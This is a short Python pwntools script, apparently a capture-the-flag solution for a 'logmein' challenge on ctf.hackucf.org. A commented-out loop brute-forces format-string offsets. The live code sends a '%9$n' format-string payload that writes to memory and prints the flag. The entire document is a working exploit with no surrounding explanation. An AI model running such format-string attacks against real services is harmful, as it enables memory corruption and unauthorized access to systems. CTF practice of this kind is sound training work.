from pwn import *

# for x in xrange(1,256):
# 	p = process('./logmein')
# 	print p.recvuntil(':')
# 	p.send('AAAA%{}$x\n'.format(x))
# 	p.recvline()
# 	print 'offset:{} , {}'.format(x, p.recvline())
# 	p.send('\n')
# 	p.close()

# at offset 9 it gets address of user variable, so %9$n will write to this addr

p = remote('ctf.hackucf.org', 7006)
p.recvuntil(':')
p.send('AAAA%{}$n\n'.format(9))

# print p.recvline()
p.recvuntil('AAAA')
p.send('\n')
p.recvuntil('!\n')
print p.recvline() # <== flag line

p.close()
